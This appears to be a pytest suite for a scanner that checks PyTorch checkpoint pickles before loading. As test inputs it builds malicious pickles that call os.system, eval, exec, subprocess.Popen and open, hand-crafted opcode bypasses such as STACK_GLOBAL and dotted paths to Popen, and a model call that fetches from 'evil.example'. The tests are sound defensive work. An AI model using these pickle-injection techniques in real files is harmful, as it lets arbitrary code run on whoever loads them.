from __future__ import annotations

import os
import pickle
import subprocess
import zipfile
from collections import OrderedDict
from pathlib import Path
from typing import Any

import pytest

from edgebench.ptscan import _REDUCIBLE, scan_checkpoint

REPO = Path(__file__).resolve().parents[2]


def checkpoint(path: Path, payload: bytes, member: str = "model/data.pkl") -> Path:
    with zipfile.ZipFile(path, "w") as z:
        z.writestr(member, payload)
    return path


class Evil:
    def __init__(self, fn: Any, *args: Any) -> None:
        self.fn, self.args = fn, args

    def __reduce__(self) -> tuple[Any, tuple[Any, ...]]:
        return self.fn, self.args


def test_a_plain_model_like_pickle_is_accepted(tmp_path: Path) -> None:
    payload = pickle.dumps({"model": OrderedDict(a=1), "names": {0: "oreo"}}, protocol=2)
    result = scan_checkpoint(checkpoint(tmp_path / "ok.pt", payload))
    assert result.ok and "collections.OrderedDict" in result.seen


@pytest.mark.parametrize(
    ("fn", "args", "named"),
    [
        (os.system, ("echo pwned",), "system"),
        (eval, ("1+1",), "eval"),
        (exec, ("print(1)",), "exec"),
        (subprocess.Popen, (["calc"],), "Popen"),
        (__import__, ("os",), "__import__"),
        (open, ("secret.txt",), "open"),
    ],
)
def test_a_pickle_that_would_call_dangerous_code_is_refused(tmp_path: Path, fn: Any, args: Any, named: str) -> None:
    payload = pickle.dumps({"model": Evil(fn, *args)}, protocol=2)
    result = scan_checkpoint(checkpoint(tmp_path / "evil.pt", payload))
    assert not result.ok
    assert result.problem is not None and "never needs" in result.problem
    assert any(named in r for r in result.refused)


def test_an_evil_call_hidden_among_allowed_ones_is_still_found(tmp_path: Path) -> None:
    payload = pickle.dumps(OrderedDict(model=OrderedDict(), x=Evil(os.system, "echo pwned")), protocol=2)
    assert not scan_checkpoint(checkpoint(tmp_path / "mixed.pt", payload)).ok


def test_package_installing_helper_inside_ultralytics_is_refused(tmp_path: Path) -> None:
    """A name that looks like it belongs to Ultralytics is not enough: only known classes and helpers pass."""
    raw = b"cultralytics.utils.checks\ncheck_requirements\n(Vx\ntR."  # protocol-0 GLOBAL + REDUCE
    result = scan_checkpoint(checkpoint(tmp_path / "pip.pt", raw))
    assert not result.ok and "check_requirements" in (result.problem or "")


def test_a_lower_case_function_in_a_layer_namespace_is_refused(tmp_path: Path) -> None:
    raw = b"ctorch.nn.modules.utils\n_ntuple\n(I2\ntR."
    assert not scan_checkpoint(checkpoint(tmp_path / "fn.pt", raw)).ok


def test_a_pickle_in_a_newer_protocol_is_refused_with_a_way_forward(tmp_path: Path) -> None:
    payload = pickle.dumps(
        OrderedDict(a=1), protocol=4
    )  # what Python writes by default: PyTorch's saver uses protocol 2
    result = scan_checkpoint(checkpoint(tmp_path / "p4.pt", payload))
    assert not result.ok and "protocol 4" in (result.problem or "") and "torch.save" in (result.problem or "")


def test_the_stack_global_instruction_is_refused_even_under_a_protocol_two_header(tmp_path: Path) -> None:
    # PROTO 2, push "os", push "system", STACK_GLOBAL, STOP: the header says 2 but the instruction is a protocol-4 one.
    raw = b"\x80\x02" + b"\x8c\x02os" + b"\x8c\x06system" + b"\x93" + b"."
    result = scan_checkpoint(checkpoint(tmp_path / "sg.pt", raw))
    assert not result.ok and "STACK_GLOBAL" in (result.problem or "")


def test_a_dotted_attribute_path_that_would_reach_subprocess_is_refused(tmp_path: Path) -> None:
    """Under protocol 4 the real unpickler walks 'a.b.c.Popen' attribute by attribute, and a capitalised last word
    passed an earlier version of this scanner. Verified in the converter environment that np.f2py.subprocess.Popen
    resolves."""
    namespace = b"cultralytics.nn.modules.conv\n"
    dotted = b"np.f2py.subprocess.Popen\n"
    with_header = scan_checkpoint(checkpoint(tmp_path / "a.pt", b"\x80\x04" + namespace + dotted + b"."))
    assert not with_header.ok and "protocol 4" in (with_header.problem or "")
    # the same path with no protocol marker: the unpickler would not walk it, but nothing legitimate looks like this
    # either
    bare = scan_checkpoint(checkpoint(tmp_path / "b.pt", namespace + dotted + b"."))
    assert not bare.ok and "dotted path" in (bare.problem or "")


@pytest.mark.parametrize(
    "global_name",
    [
        b"torch.hub.Path",  # a harmless class reached through a path: proves the technique, so it is refused too
        b"multiprocessing.Process.start.Anything",
        b"FloatStorage x",  # a space smuggled into the name
        b"FloatStorage\r",  # a control character
        b"",
    ],
)
def test_odd_global_names_are_refused(tmp_path: Path, global_name: bytes) -> None:
    raw = b"ctorch.nn.modules.module\n" + global_name + b"\n."
    assert not scan_checkpoint(checkpoint(tmp_path / "odd.pt", raw)).ok


def test_a_protocol_three_pickle_is_refused(tmp_path: Path) -> None:
    result = scan_checkpoint(checkpoint(tmp_path / "p3.pt", pickle.dumps(OrderedDict(a=1), protocol=3)))
    assert not result.ok and "protocol 3" in (result.problem or "")


def test_a_renamed_text_file_is_refused_with_a_readable_message(tmp_path: Path) -> None:
    p = tmp_path / "notes.pt"
    p.write_text("this is just text")
    result = scan_checkpoint(p)
    assert not result.ok and "not a PyTorch checkpoint" in (result.problem or "")


def test_a_zip_without_a_pickle_is_refused(tmp_path: Path) -> None:
    result = scan_checkpoint(checkpoint(tmp_path / "z.pt", b"hello", member="readme.txt"))
    assert not result.ok and "no data.pkl" in (result.problem or "")


def test_a_corrupt_pickle_is_refused_not_crashed(tmp_path: Path) -> None:
    assert not scan_checkpoint(checkpoint(tmp_path / "bad.pt", b"\x80\x02\xff\xff garbage")).ok


@pytest.mark.skipif(not (REPO / "spikes" / "models" / "yolo11n.pt").exists(), reason="needs the Phase 0 sample model")
def test_the_real_yolo11n_checkpoint_passes() -> None:
    result = scan_checkpoint(REPO / "spikes" / "models" / "yolo11n.pt")
    assert result.ok, result.problem
    assert "ultralytics.nn.tasks.DetectionModel" in result.seen


def _zip_with_encrypted_member(path: Path) -> Path:
    info = zipfile.ZipInfo("model/data.pkl", date_time=(2026, 1, 1, 0, 0, 0))
    info.flag_bits |= 0x1  # "encrypted": reading it raises RuntimeError, which a narrow except would let through
    with zipfile.ZipFile(path, "w") as z:
        z.writestr(info, b"not really encrypted")
    return path


def test_a_zip_that_makes_the_reader_raise_something_unexpected_is_refused_not_crashed(tmp_path: Path) -> None:
    result = scan_checkpoint(_zip_with_encrypted_member(tmp_path / "enc.pt"))
    assert not result.ok and "could not be read safely" in (result.problem or "")


# --- calls: what a pickle may *run*, as opposed to which names it mentions
# --------------------------------------------- Hand-written pickles (protocol 0/2 opcodes): c = GLOBAL, ( = MARK, t
# = TUPLE, R = REDUCE, ) = EMPTY_TUPLE, \x81 = NEWOBJ, p0 / g0 = memo put / get, 0 = POP, } = EMPTY_DICT, b = BUILD,
# . = STOP.

CALLS_A_CLASS_WITH_DATA = [
    pytest.param(
        b"cultralytics.nn.tasks\nDetectionModel\n(Vhttps://evil.example/model.yaml\ntR.",
        "ultralytics.nn.tasks.DetectionModel",
        id="a task model called with a URL: Ultralytics would download it and build layers from it",
    ),
    pytest.param(
        b"cultralytics.nn.tasks\nDetectionModel\np0\n0g0\n(Vhttps://evil.example/model.yaml\ntR.",
        "ultralytics.nn.tasks.DetectionModel",
        id="the same call reached through the pickle memo",
    ),
    pytest.param(
        b"ctorch.nn.modules.conv\nConv2d\n(I3\nI3\nI3\ntR.",
        "torch.nn.modules.conv.Conv2d",
        id="a layer class called: layers are only ever created, never called",
    ),
    pytest.param(
        b"cultralytics.utils.loss\nv8DetectionLoss\n)R.",
        "ultralytics.utils.loss.v8DetectionLoss",
        id="a loss class called",
    ),
]


@pytest.mark.parametrize(("raw", "named"), CALLS_A_CLASS_WITH_DATA)
def test_calling_a_class_with_data_from_the_file_is_refused(tmp_path: Path, raw: bytes, named: str) -> None:
    result = scan_checkpoint(checkpoint(tmp_path / "call.pt", raw))
    assert not result.ok and named in result.refused
    assert "calls" in (result.problem or "") and "with data from the file" in (result.problem or "")


def test_calling_something_the_file_computed_is_refused(tmp_path: Path) -> None:
    # OrderedDict() builds an object, then that object is called: the callee is not a name the scanner can judge.
    result = scan_checkpoint(checkpoint(tmp_path / "computed.pt", b"ccollections\nOrderedDict\n)R)R."))
    assert not result.ok and "a callable the file computes" in result.refused


def test_the_tensor_rebuilder_that_calls_a_function_it_is_handed_is_refused(tmp_path: Path) -> None:
    """It would let a file call DetectionModel without ever REDUCE-ing it. No real checkpoint uses it."""
    result = scan_checkpoint(checkpoint(tmp_path / "indirect.pt", b"ctorch._tensor\n_rebuild_from_type_v2\n)R."))
    assert not result.ok and "torch._tensor._rebuild_from_type_v2" in result.refused


def test_creating_a_model_object_without_calling_it_is_what_real_checkpoints_do_and_passes(tmp_path: Path) -> None:
    created = b"\x80\x02cultralytics.nn.tasks\nDetectionModel\n)\x81}b."  # NEWOBJ, then BUILD with a state dict
    assert scan_checkpoint(checkpoint(tmp_path / "new.pt", created)).ok
    layer = b"\x80\x02ctorch.nn.modules.conv\nConv2d\n)\x81}b."
    assert scan_checkpoint(checkpoint(tmp_path / "layer.pt", layer)).ok


def test_the_ten_callables_real_checkpoints_use_are_each_accepted(tmp_path: Path) -> None:
    for name in sorted(_REDUCIBLE):
        module, _, attr = name.rpartition(".")
        raw = b"c" + module.encode() + b"\n" + attr.encode() + b"\n)R."
        assert scan_checkpoint(checkpoint(tmp_path / "ok.pt", raw)).ok, name
